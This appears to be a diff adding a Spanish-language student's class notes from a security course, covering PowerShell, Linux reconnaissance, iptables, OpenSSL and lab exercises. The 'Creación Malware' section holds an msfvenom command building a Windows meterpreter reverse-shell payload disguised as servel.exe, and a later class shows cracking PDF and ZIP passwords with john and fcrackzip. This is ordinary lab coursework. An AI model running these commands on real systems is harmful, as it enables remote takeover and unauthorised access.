@@ -1,0 +1,133 @@
+Clase 25-06 Windows S.O.
+------------------------
+POWERSHELL
+Get-Alias (ejemplo : Get-Alias pwd)
+Set-Location = cd
+get-Host
+Get-Disk o Get-Disk | Format-List
+Get-Volume
+Get-NetIPinterface
+Get-NetIPinterface -AddressFamily Ipv4/IPv6
+netipaddress
+Get-NetRoute
+Test-NetConnection emol.com -port 80
+Test-NetConnection emol.com -Traceroute
+Resolve-DnsName -name www.duoc.cl
+Get-Package
+Get-EventLog -List 
+Get-EventLog -Newest 20 -LogName Security | Format-List
+Get-FileHash {Nombre file}
+Get-FileHash -algorithm md5 .\test.txt
+Get-WindowsDriver -online -all | Out-GridView
+
+--------------------------------------------------------
+Clase 30-06 Linux
+--------------------------------------------------------
+arp-scan 192.168.1.0/24
+netdiscover -i eth0
+cat /etc/passwd  
+sh/bash/zsh
+uname -a
+cat /proc/version
+cat /etc/os-release
+pacman -Sy net-tools
+python3 -m http.server 8188
+nmap {ip a alcanzar} -v(verbose) -p- (todos los puertos) -n(Sin resolucion DNS) -Pn(sin host discovery) -oG(guarda la salida de Nmap) puertos.txt
+
+Ejemplo : cat puertos.txt | grep -oP '\d{1,5}/open' | cut -d '/' -f 1
+nmap 192.168.1.1 -sU -p67,68,53,69,123 -v
+------------------------------------------------------------------------
+Clase 09-08 Un ataque a lo que hacemos
+------------------------------------------------------------------------
+
+Clase 13-08 IPTABLES
+--------------------
+iptables -t nat -nL
+iptables -t nat -A POSTROUTING -s 172.16.1.0/24 -o eth0 -j MASQUERADE
+iptables -A FORWARD -s 192.168.1.0/24 -j DROP
+iptables -A FORWARD -i eth2 -j REJECT
+iptables -A FORWARD -i eth2 -o eth0 -j ACCEPT
+iptables -A FORWARD -i eth0 -o eth2 -j ACCEPT
+iptables -A INPUT -p icmp -i eth2 -j DROP
+iptables -A FORWARD -p tcp -i eth2 -o eth1 --dport 80 -j ACCEPT
+iptables -A FORWARD -p tcp -i eth0 -o eth0 --sport 80 -j ACCEPT
+
+iptables -nL --line-numbers -v
+iptables -D FORWARD 1
+iptables-save > firewall
+iptables-restore < firewall
+
+
+Clase 23-08 CIfrado con Openssl
+-------------------------------
+
+Cifrar y decifrar asimetrica
+----------------------------
+openssl aes-256-cbc -a -e -in diccionario -out cifrado -pbkdf2
+openssl aes-256-cbc -a -d -in cifrado -out descifrado -pbkdf2
+
+openssl rsautl -encrypt -inkey publicaBob.key -pubin -in secreto -out secretocifrado
+openssl rsautl -decrypt -inkey privadaBob.key -in secretocifrado -out carta
+
+Firma digital
+-------------
+openssl dgst -sha256 -sign privadaAlice.key -out firmaalice secreto
+openssl dgst -sha256 -verify publicaAlice.key -signature firmaalice secreto
+
+--------------------------------------------------------
+HMAC (codigo de autenticacion de menjade basado en HASH)
+--------------------------------------------------------
+openssl x509 -in base64decode-org.pem -text
+  179  openssl x509 -in base64decode-org.pem -noout -serial
+  180  openssl x509 -in base64decode-org.pem -noout -date
+  181  openssl x509 -in base64decode-org.pem -noout -dates
+  182  openssl x509 -in base64decode-org.pem -noout -subject
+  183  openssl x509 -in base64decode-org.pem -noout -fingerprint
+  184  openssl x509 -in base64decode-org.pem -noout -modulus
+  185  openssl x509 -in emol-com.pem -noout -subject
+  186  openssl x509 -in emol-com.pem -noout -dates
+  187  history
+  188  openssl s_client -showcerts -connect lun.com:443 | openssl x509 -outform pem > lun
+  189  openssl s_client -showcerts -connect lun.com:443 | openssl x509 -outform pem > lun
+  190  ls
+  191  openssl x509 -in lun -noout -dates
+  192  openssl x509 -in lun -noout -subject
+  193  openssl x509 -in lun -noout -serials
+  194  openssl x509 -in lun -noout -serial
+
+Clase 20-08 : Inteligencias de amenazas
+----------------------------------------------------------
+
+
+
+
+----------------------------------------------------------
+Clase 27-08 : Creación Malware
+----------------------------------------------------------
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.28 lport=443 -f exe -o servel.exe
+
+-----------------------------------------------------------
+Clase 30-08 : 
+-----------------------------------------------------------
+Obtener la contraseña de un PDF con john
+/usr/share/john/pdf2john + nombre del archivo > HashFile
+john HashFile
+john --show HashFile
+
+Como obtener las contraseñas de un .ZIP (ejemplo.zip)
+unzip ejemplo.zip (Pide contraseña)
+1. instalar fcrackzip
+		apt install fcrackzip
+
+2. fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt ejemplo.zip
+3. PASSWORd ENCONTRADA!!!
+4. unzip ejemplo.zip (ingresar la contraseña)
+
+
+
+
+
+
+
+
+
